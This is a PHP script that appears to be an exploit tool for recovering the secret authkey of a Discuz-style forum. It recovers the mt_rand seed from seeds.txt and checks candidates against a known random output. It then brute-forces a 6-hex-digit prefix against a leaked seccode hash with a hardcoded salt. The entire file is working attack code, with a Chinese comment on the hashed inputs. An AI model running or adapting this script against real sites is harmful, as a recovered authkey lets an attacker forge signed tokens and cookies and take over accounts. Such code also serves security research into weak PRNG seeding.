<?php
$seeds_file = file_get_contents('seeds.txt');
$seeds = explode("\n",$seeds_file);
for($i=0;$i<count($seeds);$i++){
    mt_srand(intval($seeds[$i]));
    $auth_key = random(10);
    $tmp = random(4);
    if($tmp == 'IDgE'){
        echo "=====================================\n";
        echo "seed:".intval($seeds[$i])."\n";
        echo "key:".$auth_key."\n";
        check($auth_key);
    }
}
function check($key){
    $saltkey = 'Y3ltot2Z';
    for($i=0;$i<16777215;$i++){
        if($i%1000000==0){
            echo ".";
        }
        if(substr(md5('6750'.md5(pad($i).$key.$saltkey)),8,18)=='9cba1661caa30f4dd3'){
        //90=ssid.$_G['uid'] ssid来自seccode 9 uid是0
            echo "\nFound key:".pad($i).$key;
            die();
        }
    }
    echo "\n";
}
function pad($i){
    $h = dechex($i);
    $h = strlen($h)==6?$h:str_repeat('0',6-strlen($h)).$h;
    return $h;
}
function random($length) {
    $hash = '';
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}
